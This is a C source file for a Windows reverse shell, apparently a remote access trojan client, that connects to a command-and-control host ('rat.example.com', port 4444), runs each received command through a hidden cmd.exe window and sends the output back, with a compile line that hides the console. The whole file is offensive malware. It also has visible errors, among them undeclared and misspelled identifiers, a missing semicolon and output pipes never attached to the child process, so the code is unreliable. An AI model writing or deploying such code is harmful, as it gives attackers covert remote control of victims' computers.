#include <winsock2.h>
#include <ws2tcpip.h>  // for getaddrinfo
#include <windows.h>
#include <string.h>
#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsa;
    SOCKET s;
    struct addrinfo hints, *result = NULL;
    int ret;

    const char* domain = "rat.example.com"; // !!!!! change this
    const char* port = "4444";

    // create winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 0;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;        //ipv4
    hints.ai_socktype = SOCK_STREAM;  //tcp

    ret = getaddrinfo(domain, port, &hints, &result);
    if (ret != 0) {
        WSACleanup();
        return 0;
    }

    // create socket
    s = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (s == INVALID_SOCKET) {;
        freeaddrinfo(result);
        WSACleanup();
        return 0;
    }

    // Connect to c2
    ret = connect(s, result->ai_addr, (int)result->ai_addrlen);
    if (ret == SOCKET_ERROR) {
        closesocket(s);
        freeaddrinfo(result);
        WSACleanup();
        return 0;
    }

	char buffer[1024];
	int byte_recvd;
	while (1) {
		memset(buffer, 0, sizeof(buffer));
		bytes = recv(s, buffer, sizeof(buffer) - 1, 0);
		if (bytes <= 0) break;
		//check for exit command
		buffer[bytes] = '\0';
		if (strcmp(buffer, "exit") == 0) break; 
		// reverse shell
		SECURITY_ATTRIBUTES sec_att = { sizeof(SECURITY_ATTRIBUTES), 0, TRUE};
		HANDLE rPipe, wPipe;
		CreatePipe(&rPipe, &wPipe, &sec_att, 0);
		SetHandleInformation(rPipe, HANDLE_FLAG_INHERIT, 0);
		
		STARUPINFOA strt_inf;
		ZeroMemory(&strt_inf, sizeof(strt_inf));
		strt_inf.cb = sizeof(strt_inf);
		strt_inf.dwFlags = STARTF_USESHOWWINDOW;
		strt_inf.wShowWindow = SW_HIDE;

		PROCESS_INFORMATION pi;
		char cmdLine[2048];
		strncpy(cmdLine, "cmd.exe /c ", sizeof(cmdLine) - 1);
		cmdLine[sizeof(cmdLine) - 1] = '\0';
		strncat(cmdLine, buffer, sizeof(cmdLine) - strlen(cmdLine) - 1)

		CreateProcessA(0, cmdLine, 0, 0, TRUE, 0, 0, 0, &strt_inf, &pi);
		CloseHandle(wpipe); //closes write pipe

		DWORD read;
		char outBuffer[4096];
		while (ReadFile(rPipe, outBuffer, sizeof(outBuffer) - 1, &read, 0) && read > 0) {
			outBuffer[read] = '\0';
			send(s, outBuffer, read, 0);
		}
		CloseHandle(rPipe);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}


    freeaddrinfo(result);
    closesocket(s);
    WSACleanup();

    return 0;
}

// 0, = NULL
// compile: cl /O2 /SUBSYSTEM:WINDOWS yourprogram.c ws2_32.lib